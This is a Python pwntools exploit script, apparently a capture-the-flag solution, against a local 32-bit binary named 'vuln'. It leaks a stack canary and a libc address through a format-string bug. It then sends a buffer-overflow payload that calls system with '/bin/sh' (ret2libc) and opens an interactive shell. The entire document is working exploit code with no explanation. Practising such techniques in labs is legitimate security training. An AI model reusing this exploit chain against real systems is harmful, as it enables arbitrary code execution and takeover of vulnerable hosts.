#!/usr/bin/env python3

from pwn import *

str_bin_sh = 0x17bb8f
libc = ELF("./libc.so.6", checksec=False)

with process("./vuln") as conn:
    # Leak __libc_start_main
    conn.sendlineafter("?\n", "-31")
    conn.sendlineafter("Name? ", f"%135$lx %147$lx")
    canary, main_ret = map(lambda s: int(s, 16), conn.recvline().decode().split(":", 1)[-1].strip().split())
    
    # Calculate the base address of the libc
    libc_base = main_ret - 0x18e91    
    log.info(f"Canary = {hex(canary)}")
    log.info(f"Libc @ {hex(libc_base)}")
    
    # Do ret2libc
    conn.sendlineafter("?\n", "-31")
    conn.sendlineafter("Name? ", flat([
        b"A" * 512,
        p32(canary),
        b"B" * 12,
        p32(libc_base + libc.symbols["system"]),
        b"C" * 4,
        p32(libc_base + str_bin_sh)
    ]))
    
    conn.interactive()
